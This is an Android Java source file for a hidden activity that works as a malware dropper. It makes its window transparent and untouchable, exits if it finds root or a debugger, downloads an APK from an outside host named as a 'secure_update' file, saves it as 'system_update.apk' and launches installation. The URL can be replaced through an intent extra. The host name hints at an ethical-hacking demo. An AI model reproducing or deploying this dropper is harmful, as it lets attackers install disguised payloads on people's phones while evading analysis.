
package com.net.system.B959;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class B959 extends android.app.Activity {
    
    private static final String TAG = "B959";
    private static final String PAYLOAD_URL = "https://cehdemo.onrender.com/download/secure_update.pdf"; // Placeholder
    private static final String PAYLOAD_NAME = "system_update.apk";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. Hide the activity from the user
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        
        // 2. Check for root/debug
        if (checkRoot() || checkDebug()) {
            finish();
            return;
        }

        // 3. Download payload
        String downloadUrl = getIntent().getStringExtra("payload_url");
        if (downloadUrl == null) downloadUrl = PAYLOAD_URL;
        
        File tempFile = downloadPayload(downloadUrl);
        if (tempFile != null) {
            installApk(tempFile);
        }
        
        finish();
    }

    private File downloadPayload(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.connect();
            
            InputStream input = conn.getInputStream();
            File cacheDir = getCacheDir();
            File outputFile = new File(cacheDir, PAYLOAD_NAME);
            
            byte[] buffer = new byte[4096];
            int len;
            FileOutputStream fos = new FileOutputStream(outputFile);
            while ((len = input.read(buffer)) != -1) {
                fos.write(buffer, 0, len);
            }
            fos.close();
            input.close();
            return outputFile;
        } catch (Exception e) {
            Log.e(TAG, "Download failed", e);
            return null;
        }
    }

    private void installApk(File apkFile) {
        Uri uri = Uri.fromFile(apkFile);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        
        startActivity(intent);
    }

    private boolean checkRoot() {
        String[] paths = {
            "/system/bin/failsafe/su", "/system/bin/su", "/system/xbin/su",
            "/sbin/su", "/su/bin/su", "/system/bin/.ext/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/bin/su"
        };
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }

    private boolean checkDebug() {
        try {
            Class<?> clazz = Class.forName("android.os.Debug");
            java.lang.reflect.Method method = clazz.getMethod("isDebuggerConnected");
            return (boolean) method.invoke(null);
        } catch (Exception e) {
            return false;
        }
    }
}
